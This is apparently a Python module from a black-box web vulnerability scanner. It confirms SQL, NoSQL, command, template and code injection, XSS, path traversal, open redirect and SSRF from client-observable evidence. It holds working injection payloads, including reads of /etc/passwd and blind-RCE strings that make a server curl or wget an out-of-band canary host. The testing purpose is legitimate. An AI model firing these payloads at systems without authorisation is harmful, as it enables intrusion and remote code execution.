"""Black-box response/timing differential oracle -- the CLIENT-ONLY witness layer.

Grey-box DAST proves an injection by reading a harness-planted marker from inside the process
(oracle.py: `WAVE-SINK-*`). Against a live URL we cannot instrument the target, so the proof has to be
observable from the client alone. This module is that proof: deterministic witnesses, one per class,
each built from what an HTTP response can show -- a content/row differential, a timing delay, a
redirect `Location`, a file signature, or (for XSS) execution in our own headless browser.

Grounding rule, black-box edition: a witness here must be an effect **benign input cannot produce** --
a true/false SQL pair that separates, a SLEEP that delays, `root:x:0:0` in a body. Reflection or a
single odd response is NOT a witness; it degrades to a review lead. XSS specifically requires EXECUTION
(handed to dom_oracle), never mere reflection.

Testability: every witness takes a `send(value) -> Resp` callable, so it is unit-tested over canned
responses with no network. The networked `Sender` (bottom) just supplies that callable in production.
"""
from __future__ import annotations

import re
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field

from . import exploit

# --- tunables (documented FP floor: these are heuristics; XSS/timing have stronger witnesses) ---
_SIMILAR = 0.95        # length-ratio >= this (and equal status) => "same-looking" response
_SLEEP_S = 3           # blind-timing sleep seconds (polite; margin below guards jitter)
_SLEEP_MARGIN = 2.0    # delayed response must exceed baseline by >= this many seconds
_BASELINE_MAX = 1.5    # ...and baseline must itself be faster than this (else timing is unreliable)

# DB error signatures (error-based SQLi) -- cross-engine, lowercased match.
_SQL_ERRORS = (
    "sql syntax", "you have an error in your sql", "warning: mysql", "mysqli", "ora-0", "oracle error",
    "sqlstate", "psqlexception", "postgresql", "sqlite3.", "unclosed quotation mark", "odbc sql",
    "syntax error at or near", "quoted string not properly terminated", "pg::syntaxerror",
)
# file-read signatures (path traversal) -- unix passwd + windows ini.
_PATH_SIG = (re.compile(r"root:.*:0:0:"), re.compile(r"\[(?:extensions|fonts|mci extensions)\]", re.I))


@dataclass
class Resp:
    status: int | None
    body: str = ""
    headers: dict = field(default_factory=dict)
    elapsed_s: float = 0.0

    @property
    def length(self):
        return len(self.body or "")


def _similar(a: Resp, b: Resp) -> bool:
    """Two responses look the same (same status, near-equal body length). Length ratio is a cheap,
    robust proxy for 'the app returned the same kind of page' -- deliberately coarse so run-to-run
    noise doesn't read as a differential."""
    if a.status != b.status:
        return False
    la, lb = a.length, b.length
    if la == 0 and lb == 0:
        return True
    return (min(la, lb) / max(la, lb, 1)) >= _SIMILAR


def _poc(cls, cwe, payload, evidence, extra=None):
    d = {"class": cls, "cwe": cwe, "payload": payload, "evidence": evidence, "oracle": "dast-diff"}
    if extra:
        d.update(extra)
    return d


# --------------------------------------------------------------------------------------------------
# witnesses -- each returns a PoC dict (proven) or None (no client-observable witness => review lead)
# --------------------------------------------------------------------------------------------------

def witness_sqli_boolean(send, url_for=None, headers=None, canary=None) -> dict | None:
    """Boolean-based: a TRUE condition reproduces the normal page; a FALSE one changes it. If the pair
    separates AND true matches a benign baseline, the param reaches a SQL predicate. If the param is
    ignored, all three look alike -> the pair does NOT separate -> no witness (correct)."""
    base = send("1")
    t = send("1' AND '1'='1")
    f = send("1' AND '1'='2")
    if base.status is None or t.status is None or f.status is None:
        return None
    if _similar(t, f):                       # pair didn't separate -> param likely ignored
        return None
    if not _similar(t, base):                # true must look like the normal response
        return None
    # stability: repeat the separating pair once; noise rarely reproduces the SAME separation.
    t2, f2 = send("1' AND '1'='1"), send("1' AND '1'='2")
    if _similar(t2, f2) or not _similar(t2, base):
        return None
    return _poc("sqli", "CWE-89", "1' AND '1'='1  vs  1' AND '1'='2",
                f"boolean differential stable: true~baseline (len {t.length}/{base.length}, "
                f"status {t.status}), false diverges (len {f.length}, status {f.status})")


def witness_sqli_error(send, url_for=None, headers=None, canary=None) -> dict | None:
    """Error-based: a single quote breaks the query and the engine leaks a recognizable error."""
    r = send("1'")
    low = (r.body or "").lower()
    for sig in _SQL_ERRORS:
        if sig in low:
            return _poc("sqli", "CWE-89", "1'",
                        f"DB error signature in response: {sig!r} (status {r.status})")
    return None


def witness_timing(send, url_for=None, headers=None, canary=None, cls="sqli", cwe="CWE-89") -> dict | None:
    """Blind time-based: a SLEEP/WAITFOR/pg_sleep payload delays the response by ~_SLEEP_S vs baseline,
    confirmed over a repeat. Shared channel for blind SQLi and blind command injection. Only trusted
    when the baseline is itself fast (a slow/variable baseline makes timing meaningless)."""
    base = send("1")
    if base.status is None or base.elapsed_s > _BASELINE_MAX:
        return None
    payloads = [
        f"1' AND SLEEP({_SLEEP_S})-- ",            # mysql
        f"1'; WAITFOR DELAY '0:0:{_SLEEP_S}'-- ",  # mssql
        f"1' AND pg_sleep({_SLEEP_S})-- ",         # postgres
    ] if cls == "sqli" else [
        f"1 & ping -n {_SLEEP_S + 1} 127.0.0.1",   # windows cmd
        f"1; sleep {_SLEEP_S}",                     # unix cmd
    ]
    need = base.elapsed_s + _SLEEP_MARGIN
    for p in payloads:
        r = send(p)
        if r.status is not None and r.elapsed_s >= need:
            r2 = send(p)                            # confirm the delay reproduces (not a one-off stall)
            if r2.elapsed_s >= need:
                return _poc(cls, cwe, p,
                            f"time-based: baseline {base.elapsed_s:.1f}s, payload {r.elapsed_s:.1f}s "
                            f"& {r2.elapsed_s:.1f}s (>= {need:.1f}s) over two sends")
    return None


def witness_open_redirect(send, url_for=None, headers=None, canary=None) -> dict | None:
    """The param controls a redirect: a 3xx whose Location points to an attacker-chosen off-origin
    host. We do NOT follow redirects (Sender uses a non-following opener), so we see the raw Location."""
    evil = "https://wave.invalid/"
    r = send(evil)
    loc = (r.headers or {}).get("Location") or (r.headers or {}).get("location") or ""
    if r.status and 300 <= r.status < 400 and "wave.invalid" in loc:
        return _poc("redirect", "CWE-601", evil,
                    f"status {r.status}, Location: {loc[:160]} (attacker-controlled host)")
    return None


def witness_path_traversal(send, url_for=None, headers=None, canary=None) -> dict | None:
    """The param is used to build a filesystem path: traversal reads a file outside the intended dir.
    Witness = a signature of a known system file (unix passwd / windows ini) in the response body."""
    for payload in ("../../../../../../etc/passwd", "..\\..\\..\\..\\..\\..\\windows\\win.ini"):
        r = send(payload)
        for sig in _PATH_SIG:
            if sig.search(r.body or ""):
                return _poc("path", "CWE-22", payload,
                            f"system-file signature in response ({sig.pattern!r}, status {r.status})")
    return None


def witness_xss(send, url_for=None, headers=None, canary=None) -> dict | None:
    """Reflected XSS: a marker payload must (1) reflect UN-encoded into the response, then (2) EXECUTE
    in a headless browser. Reflection alone is not a witness (safe contexts don't fire); the DOM oracle
    is the Tier-2 proof. For a GET vector we re-render the URL; otherwise we render the returned HTML."""
    from . import dom_oracle
    marker = "wavex" + "7q4z"                       # distinctive, alnum (survives encoding)
    payload = f"<img src=x onerror=alert('{marker}')>"
    r = send(payload)
    body = r.body or ""
    if payload not in body and f"onerror=alert('{marker}')" not in body:
        return None                                 # not reflected raw -> encoded/absent, no XSS here
    res = (dom_oracle.prove_xss(url_for(payload), headers or {}, marker)
           if url_for else dom_oracle.prove_xss("about:blank", headers or {}, marker, html=body))
    if res.get("status") == "proven":
        return _poc("xss", "CWE-79", payload,
                    res.get("evidence", "tracer executed in the rendered DOM"),
                    extra={"oracle": "dom"})
    return None


_SSTI_TEMPLATES = ("{{{a}*{b}}}", "${{{a}*{b}}}", "#{{{a}*{b}}}", "${{ {a}*{b} }}",
                   "<%= {a}*{b} %>", "{{{a}*{b}}}", "{{'{a}'*0}}{{{a}*{b}}}")
_EVAL_EXPRS = ("{a}*{b}", "({a}*{b})", ";{a}*{b};", "'+({a}*{b})+'", "`+({a}*{b})+`")


def _arith_reflected(send, payloads) -> tuple | None:
    """Shared engine for SSTI / eval: send an arithmetic payload whose PRODUCT is distinctive and absent
    from a benign baseline, then check the response for the PRODUCT (proof the server EVALUATED it) --
    not the expression (mere reflection). Returns (payload, product) on a hit, else None."""
    a, b = 73819, 91193
    product = str(a * b)                                 # the evaluated result; the literal expr can't contain it
    base = send(f"wv{a}")                                # benign: the product must not already be present
    if product in (base.body or ""):
        return None
    for tmpl in payloads:
        p = tmpl.format(a=a, b=b)
        r = send(p)
        if product in (r.body or ""):                    # the PRODUCT (not the expression) => it was evaluated
            return p, product
    return None


def witness_ssti(send, canary=None) -> dict | None:
    """Server-side template injection: an arithmetic expression in template syntax ({{..}}, ${..}, <%=..%>)
    is EVALUATED by the engine, so the response contains the product, not the literal expression."""
    hit = _arith_reflected(send, _SSTI_TEMPLATES)
    if hit:
        return _poc("ssti", "CWE-1336", hit[0],
                    f"template engine evaluated the expression (product {hit[1]} returned, not the literal)")
    return None


def witness_eval(send, canary=None) -> dict | None:
    """Code/expression injection: a bare arithmetic expression is EVALUATED server-side and its product
    appears in the response. Blind code execution (no reflection) is covered by the OAST cmd witness."""
    hit = _arith_reflected(send, _EVAL_EXPRS)
    if hit:
        return _poc("eval", "CWE-94", hit[0],
                    f"server evaluated the injected expression (product {hit[1]} in response)")
    return None


_NOSQL_ERRORS = ("mongoerror", "bsonerror", "$where", "failed to parse", "e11000",
                 "unexpected token", "mongoservererror", "cast to objectid failed")


def witness_nosqli(send, op_send=None) -> dict | None:
    """NoSQL (Mongo) injection, two client-only witnesses:
      (1) error-based -- a broken operator/quote elicits a Mongo driver error signature.
      (2) operator differential (needs `op_send`, which places a structural {$op: ..} value in a JSON
          body) -- `{$ne: X}` matches everything, `{$eq: X}` matches nothing; if the two SEPARATE and
          the baseline looks like the empty side, the param reaches a query operator -> injectable. A
          param that is NOT in a query coerces the object to a string -> no separation -> no witness."""
    r = send("'\"\\{")
    low = (r.body or "").lower()
    for sig in _NOSQL_ERRORS:
        if sig in low:
            return _poc("nosqli", "CWE-943", "'\"\\{",
                        f"NoSQL driver error signature {sig!r} in response (status {r.status})")
    if op_send is None:
        return None
    miss = "waveNoSuchValue_" + "x8z"
    base = op_send(miss)                                 # a plain (non-matching) value
    t = op_send({"$ne": miss})                           # true: matches all
    f = op_send({"$eq": miss})                           # false: matches none
    if None in (base.status, t.status, f.status):
        return None
    if _similar(t, f) or _similar(t, base):              # no separation, or $ne looks like no-match -> not injectable
        return None
    if not _similar(base, f):                            # false side should look like the non-matching baseline
        return None
    t2, f2 = op_send({"$ne": miss}), op_send({"$eq": miss})   # stability repeat
    if _similar(t2, f2):
        return None
    return _poc("nosqli", "CWE-943", '{"$ne": "<x>"} vs {"$eq": "<x>"}',
                f"operator differential stable: $ne returns a broad result (len {t.length}) that $eq "
                f"and the baseline do not (len {f.length}/{base.length}) -- param reaches a query operator")


def _witness_cmd(send, url_for=None, headers=None, canary=None):
    return witness_timing(send, url_for=url_for, headers=headers, cls="cmd", cwe="CWE-78")


# --- OUT-OF-BAND witnesses (need an OAST canary; no-op and return None without one) ---------------
# These are the black-box answer to "the effect is invisible in the response": the server reaching OUR
# listener is a hard, unforgeable witness that survives asynchrony and non-reflected effects.

def witness_ssrf(send, url_for=None, headers=None, canary=None) -> dict | None:
    """SSRF: the param is a URL the server fetches. We hand it OUR canary URL; a callback proves the
    server dialed attacker-controlled infrastructure (blind or not)."""
    if canary is None:
        return None
    token = canary.new_token()
    url = canary.url(token, getattr(canary, "host", None) or _canary_host(canary))
    send(url)
    if canary.hit(token, wait=5.0):
        return _poc("ssrf", "CWE-918", url,
                    f"server dialed our OAST canary (token {token}) -- outbound request to an "
                    f"attacker-controlled host", extra={"oracle": "oast"})
    return None


def witness_blind_rce(send, url_for=None, headers=None, canary=None) -> dict | None:
    """Blind command injection: the param flows to a shell with no visible output. We inject a command
    that makes the server curl OUR canary (several shell-separator dialects); a callback proves code
    execution even when the response shows nothing."""
    if canary is None:
        return None
    token = canary.new_token()
    cb = canary.url(token, getattr(canary, "host", None) or _canary_host(canary))
    for p in (f"1;curl {cb};", f"1|curl {cb}", f"1`curl {cb}`", f"1$(curl {cb})",
              f"1&&curl {cb}", f"1;wget -q -O- {cb};"):
        send(p)
    if canary.hit(token, wait=6.0):
        return _poc("cmd", "CWE-78", f"<shell>; curl {cb}",
                    f"server executed our injected command (OAST callback, token {token}) -- "
                    f"blind remote code execution", extra={"oracle": "oast"})
    return None


def _canary_host(canary):
    from .oast import CONTAINER_TO_HOST
    return CONTAINER_TO_HOST


# dispatch: class -> the witness(es) to try, in order. Each witness declares only the context kwargs it
# uses (url_for / headers / canary / op_send); the dispatcher passes just those. OAST witnesses are
# listed where they apply and self-skip without a canary.
_BY_CLASS = {
    "sqli":  (witness_sqli_error, witness_sqli_boolean, witness_timing),
    "xss":   (witness_xss,),
    "redirect": (witness_open_redirect,),
    "path":  (witness_path_traversal,),
    "ssti":  (witness_ssti,),
    "eval":  (witness_eval,),
    "nosqli": (witness_nosqli,),
    "cmd":   (witness_blind_rce, _witness_cmd),      # OAST first (fast+hard), then opt-in timing
    "ssrf":  (witness_ssrf,),
}
# classes with NO sound black-box witness yet. deser stays here on purpose: a sound witness needs a
# STACK-SPECIFIC gadget chain we can't synthesize blind -- faking it would mint false confirms, which
# the whole design forbids. idor/authz/access/bola are NOT here: they are handled as differentials in
# the driver (anomalous_state), not as oracle injection classes.
DEFERRED = {"deser"}


_TIMING = (witness_timing, _witness_cmd)
_SIG_CACHE: dict = {}


def _accepts(w):
    import inspect
    s = _SIG_CACHE.get(w)
    if s is None:
        try:
            s = set(inspect.signature(w).parameters)
        except (ValueError, TypeError):
            s = set()
        _SIG_CACHE[w] = s
    return s


def witness(cls, send, url_for=None, headers=None, canary=None, op_send=None, timing=True) -> dict | None:
    """Run the class-appropriate client-only witness(es). Returns a PoC dict or None (-> review lead).
    `send(value)` fires the target param with that value; `url_for(value)` (GET only) yields the URL
    the DOM oracle can re-render; `headers` carries the attacker session; `canary` (an oast.Canary)
    enables SSRF / blind-RCE; `op_send(obj)` places a structural value (NoSQL operator) in a JSON body.
    `timing=False` skips the blind time-based witnesses (seconds each, intrusive) -- opt-in for a scan."""
    ctx = {"url_for": url_for, "headers": headers, "canary": canary, "op_send": op_send}
    for w in _BY_CLASS.get((cls or "").lower(), ()):
        if not timing and w in _TIMING:
            continue
        kw = {k: v for k, v in ctx.items() if k in _accepts(w)}
        got = w(send, **kw)
        if got:
            return got
    return None


# --------------------------------------------------------------------------------------------------
# Sender -- the production networked `send` callable (tests bypass this and pass their own).
# --------------------------------------------------------------------------------------------------

class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """Do NOT follow 3xx -- we must observe the raw Location for open-redirect, and avoid chasing a
    redirect off-target during injection."""
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def _send(base_url, method, path, body=None, headers=None, timeout=12) -> Resp:
    """Full HTTP send: status + WHOLE body + response headers + wall-clock elapsed. Unlike
    exploit.fire (which truncates and drops headers/timing), the differential oracle needs all four."""
    url = base_url.rstrip("/") + "/" + str(path).lstrip("/")
    data, hdrs = None, dict(headers or {})
    if body is not None:
        import json
        data = json.dumps(body).encode()
        hdrs.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=data, headers=hdrs, method=str(method).upper())
    opener = urllib.request.build_opener(_NoRedirect)
    from . import dast_throttle
    dast_throttle.wait()
    t0 = time.monotonic()
    try:
        with opener.open(req, timeout=timeout) as r:
            return Resp(r.status, r.read().decode("utf-8", "replace"), dict(r.headers),
                        time.monotonic() - t0)
    except urllib.error.HTTPError as e:            # 3xx/4xx/5xx: still a real response to diff
        return Resp(e.code, e.read().decode("utf-8", "replace"), dict(e.headers or {}),
                    time.monotonic() - t0)
    except Exception as e:
        return Resp(None, str(e)[:200], {}, time.monotonic() - t0)


class Sender:
    """Binds a (route, vector, param) target to a `send(value)` callable the witnesses consume. Builds
    each concrete request with exploit.assemble (the same mechanical step the grey-box path uses)."""

    def __init__(self, base_url, method, route, vector, param, headers=None, path_params=None,
                 timeout=12):
        self.base_url, self.method, self.route = base_url, method, route
        self.vector, self.param = vector, param
        self.headers, self.timeout = dict(headers or {}), timeout
        self.path_params = dict(path_params or {})

    def _req(self, value):
        d = {"method": self.method, "route": self.route, "vector": self.vector,
             "param": self.param, "value": value, "path_params": self.path_params}
        # assemble embeds the value into the chosen vector; it requires the marker (value) be present.
        return exploit.assemble(d, value)

    def send(self, value) -> Resp:
        r = self._req(value)
        merged = {**self.headers, **(r.get("headers") or {})}
        return _send(self.base_url, r["method"], r["path"], r.get("body"), merged, self.timeout)

    def url_for(self, value):
        """The full GET URL for the DOM oracle to re-render (None for non-GET -- render HTML instead)."""
        if str(self.method).upper() != "GET":
            return None
        r = self._req(value)
        return self.base_url.rstrip("/") + "/" + r["path"].lstrip("/")

    def send_op(self, op_obj) -> Resp:
        """Send `{param: op_obj}` as a JSON body -- NoSQL operator injection needs a STRUCTURAL value
        (e.g. {"$ne": x}); assemble() would stringify it. Path params are still filled from the route;
        a GET route is sent as POST (operator injection is a body technique)."""
        r = self._req("x")
        method = r["method"] if str(r["method"]).upper() != "GET" else "POST"
        merged = {**self.headers, "Content-Type": "application/json"}
        return _send(self.base_url, method, r["path"], {self.param or "input": op_obj},
                     merged, self.timeout)
